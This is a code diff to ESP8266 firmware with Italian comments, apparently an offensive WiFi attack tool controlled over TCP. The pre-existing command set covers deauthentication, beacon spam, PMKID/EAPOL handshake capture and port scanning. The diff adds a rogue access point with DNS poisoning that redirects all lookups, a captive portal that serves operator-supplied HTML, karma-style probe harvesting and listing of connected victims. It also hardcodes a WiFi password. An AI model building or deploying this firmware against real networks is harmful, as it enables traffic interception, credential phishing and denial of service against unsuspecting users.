@@ -11,6 +11,7 @@
 //   Cmd:
 //     0x01 ping                         → "RHS-8266"
 //     0x02 scan[sec]                    → [rssi][ch][bssid6][sec][ssidlen][ssid]*
+//     0x03 wifiResults                  → stessi risultati di 0x02 (senza rescan)
 //     0x04 deauth[mac6][ch][count]      → "deauth ok"
 //     0x05 beacon[count][len][ssid]...  → armato (loop in background)
 //     0x06 pmkid[mac6][ch]              → EAPOL raw (max 128B) o "no eapol"
@@ -19,18 +20,14 @@
 //     0x10 tcp_scan[ip4][count][port u16 xN] → [port u16][bannerLen][banner]*
 //     0x11 tcp_roundtrip[ip4][port u16][tcs][plen u16][payload] → bytes
 //     0x12 udp_roundtrip[ip4][port u16][tcs][plen u16][payload] → bytes
-//
-// Note: ogni operazione che cambia canale (deauth, beacon, pmkid) spezza
-// momentaneamente lo STA. Il risultato viene bufferizzato e consegnato
-// al primo client TCP che si riconnette.
 
 #include <ESP8266WiFi.h>
 #include <WiFiUdp.h>
 #include <user_interface.h>
 
 // ============ CONFIG ============
-const char *STA_SSID = "Hexxeted";      // hotspot personale iPhone
-const char *STA_PASS = "lwae9180";      // ← cambia
+const char *STA_SSID = "Hexxeted";
+const char *STA_PASS = "lwae9180";
 const uint16_t TCP_PORT = 3333;
 
 // ============ STATO ============
@@ -72,6 +69,21 @@ struct APEntry { uint8_t bssid[6]; uint8_t ch; int8_t rssi; char ssid[33]; uint8
 APEntry aps[24];
 int apCount = 0;
 
+// ============ rogue AP (PineApple) ============
+bool rogue = false;
+char rogueSsid[33];
+uint8_t roguePass[65];
+uint8_t roguePassLen = 0;
+bool dnsPoison = false;
+char portalPage[800];
+int portalLen = 0;
+bool karmaArmed = false;
+String probeSsids[24];
+int probeCount = 0;
+
+WiFiUDP dnsSrv;
+WiFiServer portalSrv(80);
+
 // ============ crc8 ============
 uint8_t crc8(const uint8_t *d, int n) {
   uint8_t crc = 0;
@@ -112,6 +124,26 @@ void sendFrame(uint8_t cmdEcho, uint8_t status, const uint8_t *payload, int len)
 
 // ============ PMKID sniffer ============
 void snifferCb(uint8_t *buf, uint16_t len) {
+  // karma: probe request (fc 0x40/0x50) → SSID unici nella lista
+  if (karmaArmed && !pmkidArmed && len > 26 && (buf[0] == 0x40 || buf[0] == 0x50)) {
+    int o = 24;
+    while (o + 2 <= len && o < 220) {
+      uint8_t eid = buf[o], el = buf[o + 1];
+      if (eid == 0 && el > 0 && el <= 32) {
+        bool dup = false;
+        for (int k = 0; k < probeCount; k++)
+          if (probeSsids[k].length() == el && memcmp(probeSsids[k].c_str(), buf + o + 2, el) == 0) { dup = true; break; }
+        if (!dup && probeCount < 24) {
+          char t[33]; memcpy(t, buf + o + 2, el); t[el] = 0;
+          probeSsids[probeCount++] = String(t);
+          Serial.printf("[karma] probe %s\n", t);
+        }
+        break;
+      }
+      o += 2 + el;
+    }
+    return;
+  }
   if (!pmkidArmed || len < 40) return;
   uint8_t *d = buf;
   int lim = (len > 160) ? 160 : len;
@@ -269,6 +301,43 @@ void feedRx(const uint8_t *d, int n) {
   }
 }
 
+// ============ rogue AP: DNS poison + captive portal ============
+void dnsTick() {
+  if (!rogue || !dnsPoison) return;
+  int ps = dnsSrv.parsePacket();
+  if (ps <= 0) return;
+  static uint8_t q[512];
+  int n = dnsSrv.read(q, sizeof(q));
+  if (n < 17) return;
+  // risposta: copio la query, fixo flags QR+AA, appendo 1 answer A 192.168.4.1
+  q[2] = 0x85; q[3] = 0x80;
+  q[6] = 0; q[7] = 1;
+  static const uint8_t ans[16] = {0xC0, 0x0C, 0x00, 0x01, 0x00, 0x01,
+                                  0x00, 0x00, 0x00, 0x01, 0x00, 0x04, 192, 168, 4, 1};
+  dnsSrv.beginPacket(dnsSrv.remoteIP(), dnsSrv.remotePort());
+  dnsSrv.write(q, n);
+  dnsSrv.write(ans, sizeof(ans));
+  dnsSrv.endPacket();
+}
+
+void portalTick() {
+  if (!rogue) return;
+  WiFiClient c = portalSrv.available();
+  if (!c) return;
+  uint32_t t0 = millis();
+  String head;
+  while (c.connected() && millis() - t0 < 1500) {
+    while (c.available()) head += (char)c.read();
+    if (head.indexOf("\r\n\r\n") >= 0) break;
+  }
+  String page = (portalLen > 0) ? String(portalPage) :
+    String("<html><body><h2>RHS Portal</h2><p>connessione acquisita dal bridge RedHatSec</p></body></html>");
+  String r = "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nConnection: close\r\nContent-Length: ";
+  r += page.length(); r += "\r\n\r\n"; r += page;
+  c.print(r);
+  c.stop();
+}
+
 // ============ dispatcher ============
 void dispatchCmd(uint8_t cmd, const uint8_t *pl, int plen) {
   Serial.printf("[RX] cmd=0x%02X plen=%d\n", cmd, plen);
@@ -283,7 +352,7 @@ void dispatchCmd(uint8_t cmd, const uint8_t *pl, int plen) {
       break;
     }
 
-    case 0x03: {  // wifiResults esplicito: ultimi risultati, o avvia scan se vuoti
+    case 0x03: {
       if (apCount > 0) {
         uint8_t payload[900];
         int i = 0;
@@ -366,10 +435,14 @@ void dispatchCmd(uint8_t cmd, const uint8_t *pl, int plen) {
         wifi_promiscuous_enable(0);
         wifi_set_channel(apChannel);
       }
+      if (karmaArmed) {
+        karmaArmed = false;
+        wifi_promiscuous_enable(0);
+      }
       sendFrame(0x07, 0x00, (const uint8_t *)"stopped", 7);
       break;
 
-    case 0x08: {  // join(ssidLen,ssid,passLen,pass) — STA verso la rete target
+    case 0x08: {  // join — FIX: disconnect(false), no radio off, reset su fail
       int p = 0;
       if (plen < 2) { sendFrame(0x08, 0x02, (const uint8_t *)"bad args", 8); break; }
       int sl = pl[p++];
@@ -384,19 +457,19 @@ void dispatchCmd(uint8_t cmd, const uint8_t *pl, int plen) {
       beaconActive = false;
       pmkidArmed = false;
 
-      WiFi.disconnect(true);      // stacca dalla rete corrente, altrimenti begin è ignorato
+      WiFi.disconnect(false);   // FIX: radio resta on, niente WIFI_OFF inutile
       delay(200);
       WiFi.mode(WIFI_STA);
       WiFi.begin(ssid, pass[0] ? pass : NULL);
 
-      joinTargetSsid = String(ssid);  // per la race: status=CONNECTED subito se già connessi
+      joinTargetSsid = String(ssid);
       joinPending = true;
       joinStart = millis();
       Serial.printf("[join] %s\n", ssid);
       break;
     }
 
-    case 0x10: {  // tcp_scan(ip4, count, port u16 LE xN) → [port u16 LE][bannerLen][banner]...
+    case 0x10: {
       IPAddress ip(pl[0], pl[1], pl[2], pl[3]);
       int cnt = pl[4];
       if (cnt > 12) cnt = 12;
@@ -421,7 +494,7 @@ void dispatchCmd(uint8_t cmd, const uint8_t *pl, int plen) {
       break;
     }
 
-    case 0x11: {  // tcp_roundtrip(ip4, port u16, timeout_cs, plen u16, payload) → bytes
+    case 0x11: {
       IPAddress ip(pl[0], pl[1], pl[2], pl[3]);
       uint16_t port = pl[4] | (pl[5] << 8);
       int tcs = pl[6];
@@ -444,7 +517,7 @@ void dispatchCmd(uint8_t cmd, const uint8_t *pl, int plen) {
       break;
     }
 
-    case 0x12: {  // udp_roundtrip(ip4, port u16, timeout_cs, plen u16, payload) → bytes
+    case 0x12: {
       IPAddress ip(pl[0], pl[1], pl[2], pl[3]);
       uint16_t port = pl[4] | (pl[5] << 8);
       int tcs = pl[6];
@@ -466,6 +539,104 @@ void dispatchCmd(uint8_t cmd, const uint8_t *pl, int plen) {
       }
       u.stop();
       sendFrame(0x12, rl > 0 ? 0x00 : 0x01, resp, rl);
+      break;
+    }
+
+    case 0x13: {  // rogueStart[ssidLen][ssid][passLen][pass][dnsPoison] — AP+STA (il bridge resta su hotspot)
+      int p = 0;
+      if (plen < 2) { sendFrame(0x13, 0x02, (const uint8_t *)"bad args", 8); break; }
+      int sl = pl[p++];
+      if (p + sl > plen || sl > 32) { sendFrame(0x13, 0x02, (const uint8_t *)"bad args", 8); break; }
+      memcpy(rogueSsid, pl + p, sl); rogueSsid[sl] = 0; p += sl;
+      int pw = 0;
+      if (p < plen) pw = pl[p++];
+      if (p + pw > plen || pw > 64) { sendFrame(0x13, 0x02, (const uint8_t *)"bad args", 8); break; }
+      memcpy(roguePass, pl + p, pw); roguePassLen = pw; p += pw;
+      dnsPoison = p < plen ? pl[p] != 0 : false;
+
+      wifi_promiscuous_enable(0);
+      karmaArmed = false;
+      // AP+STA: softAP segue il canale dello STA → il bridge TCP (hotspot) sopravvive
+      if (!WiFi.softAP(rogueSsid, pw ? (const char *)roguePass : NULL, apChannel)) {
+        sendFrame(0x13, 0x02, (const uint8_t *)"softAP fail", 11);
+        break;
+      }
+      delay(300);
+      dnsSrv.stop();
+      if (dnsPoison) dnsSrv.begin(53);
+      portalSrv.stop();
+      portalSrv.begin();
+      rogue = true;
+      Serial.printf("[rogue] %s ch%d dns=%d\n", rogueSsid, apChannel, dnsPoison);
+      sendFrame(0x13, 0x00, nullptr, 0);
+      break;
+    }
+
+    case 0x14: {  // rogueStop
+      rogue = false;
+      dnsPoison = false;
+      dnsSrv.stop();
+      portalSrv.stop();
+      WiFi.softAPdisconnect(true);
+      delay(200);
+      WiFi.mode(WIFI_STA);
+      WiFi.begin(STA_SSID, STA_PASS);
+      Serial.println("[rogue] stop → STA");
+      sendFrame(0x14, 0x00, nullptr, 0);
+      break;
+    }
+
+    case 0x15: {  // rogueClients → [cnt][mac6][ip4]*n
+      if (!rogue) { sendFrame(0x15, 0x02, (const uint8_t *)"rogue off", 9); break; }
+      struct station_info *st = wifi_softap_get_station_info();
+      static uint8_t out[113];
+      int oi = 0;
+      int cnt = 0;
+      for (struct station_info *s = st; s && cnt < 8 && oi < 104; s = STAILQ_NEXT(s, next)) {
+        cnt++;
+        memcpy(out + oi, s->bssid, 6); oi += 6;
+        out[oi++] = (uint8_t)(s->ip.addr & 0xFF);
+        out[oi++] = (uint8_t)((s->ip.addr >> 8) & 0xFF);
+        out[oi++] = (uint8_t)((s->ip.addr >> 16) & 0xFF);
+        out[oi++] = (uint8_t)((s->ip.addr >> 24) & 0xFF);
+      }
+      wifi_softap_free_station_info();
+      static uint8_t out2[113];
+      out2[0] = (uint8_t)cnt;
+      memcpy(out2 + 1, out, oi);
+      sendFrame(0x15, 0x00, out2, oi + 1);
+      break;
+    }
+
+    case 0x16: {  // karma[on] — arm/disarm; disarm → CSV probe trovati
+      if (plen < 1) { sendFrame(0x16, 0x02, (const uint8_t *)"bad args", 8); break; }
+      if (pl[0]) {
+        karmaArmed = true;
+        probeCount = 0;
+        wifi_promiscuous_enable(1);   // AP resta su, monitor sul canale corrente
+        Serial.println("[karma] armed");
+        sendFrame(0x16, 0x00, nullptr, 0);
+      } else {
+        karmaArmed = false;
+        wifi_promiscuous_enable(0);
+        String csv;
+        for (int k = 0; k < probeCount; k++) {
+          if (k) csv += ",";
+          csv += probeSsids[k];
+        }
+        Serial.printf("[karma] stop %d probe\n", probeCount);
+        sendFrame(0x16, 0x00, (const uint8_t *)csv.c_str(), csv.length());
+      }
+      break;
+    }
+
+    case 0x17: {  // portalSet[len u16][html] (max 780B)
+      if (plen < 2) { sendFrame(0x17, 0x02, (const uint8_t *)"bad args", 8); break; }
+      int l = pl[0] | (pl[1] << 8);
+      if (2 + l > plen || l > 780) { sendFrame(0x17, 0x02, (const uint8_t *)"bad args", 8); break; }
+      memcpy(portalPage, pl + 2, l);
+      portalLen = l;
+      sendFrame(0x17, 0x00, nullptr, 0);
       break;
     }
 
@@ -495,8 +666,8 @@ void setup() {
     Serial.printf("[STA] ok ip=%s ch=%d\n",
                   WiFi.localIP().toString().c_str(), apChannel);
   } else {
-    // debug: stampo lo scan per vedere cosa c'è in onda (se l'SSID non c'è = 5GHz)
     Serial.println("[STA] FAIL — scan diagnostico…");
+    WiFi.scanDelete();
     WiFi.scanNetworks(true, true);
     uint32_t t1 = millis();
     while (WiFi.scanComplete() == WIFI_SCAN_RUNNING && millis() - t1 < 8000) delay(100);
@@ -509,10 +680,10 @@ void setup() {
                     (int)WiFi.encryptionType(k),
                     WiFi.SSID(k) == STA_SSID ? "  <<<< TROVATA" : "");
     }
+    WiFi.scanDelete();   // FIX: libera la RAM dopo lo scan diagnostico
   }
 
   wifi_set_promiscuous_rx_cb(snifferCb);
-  // SDK3: filtro hardware rimosso, il filtro EAPOL è in snifferCb
 
   server.begin();
   server.setNoDelay(true);
@@ -521,7 +692,6 @@ void setup() {
 
 // ============ loop ============
 void loop() {
-  // client TCP
   if (!client || !client.connected()) {
     if (client) client.stop();
     client = server.available();
@@ -537,7 +707,6 @@ void loop() {
     }
   }
 
-  // RX
   int avail;
   while (client && client.connected() && (avail = client.available()) > 0) {
     uint8_t buf[128];
@@ -545,10 +714,13 @@ void loop() {
     if (n > 0) feedRx(buf, n);
   }
 
-  // scan async
   pollScan();
 
-  // join rete target (STA) — risposta asincrona, con verifica SSID (race fix)
+  // rogue AP: DNS poison + captive portal
+  dnsTick();
+  portalTick();
+
+  // join async — FIX: su timeout reset esplicito a STA_SSID (niente reconnect al target morto)
   if (joinPending) {
     if (WiFi.status() == WL_CONNECTED && WiFi.SSID() == joinTargetSsid) {
       joinPending = false;
@@ -557,25 +729,27 @@ void loop() {
       sendFrame(0x08, 0x00, (const uint8_t *)ips.c_str(), ips.length());
     } else if (millis() - joinStart > 15000) {
       joinPending = false;
+      WiFi.disconnect(false);
+      WiFi.begin(STA_SSID, STA_PASS);   // riporta a casa subito
       sendFrame(0x08, 0x02, (const uint8_t *)"join failed", 11);
+      Serial.println("[join] FAIL → reset STA_SSID");
     }
   }
 
-  // reconnect STA a mano (autoReconnect off) + refresh canale hotspot
+  // manual reconnect — FIX: begin(STA_SSID), non reconnect() al target morto
   static uint32_t lastReconnect = 0;
   if (!joinPending && !pmkidArmed && !beaconActive &&
       WiFi.status() != WL_CONNECTED && millis() - lastReconnect > 10000) {
     lastReconnect = millis();
-    WiFi.reconnect();
+    WiFi.begin(STA_SSID, STA_PASS);
   }
-  if (WiFi.status() == WL_CONNECTED && apChannel != WiFi.channel()) {
-    apChannel = WiFi.channel();   // il canale hotspot può cambiare tra sessioni
+  if (WiFi.status() == WL_CONNECTED) {
+    int ch = WiFi.channel();
+    if (ch > 0 && apChannel != (uint8_t)ch) apChannel = (uint8_t)ch;
   }
 
-  // beacon spam
   if (beaconActive) beaconLoop();
 
-  // PMKID: timeout / capture → hop back
   if (pmkidArmed && (pmkidCaptured || millis() - pmkidStart > 25000)) {
     pmkidArmed = false;
     wifi_promiscuous_enable(0);
@@ -591,7 +765,6 @@ void loop() {
     else              sendFrame(0x06, 0x02, (const uint8_t *)"no eapol", 8);
   }
 
-  // LED
   if (client && client.connected()) {
     digitalWrite(2, LOW);
   } else {
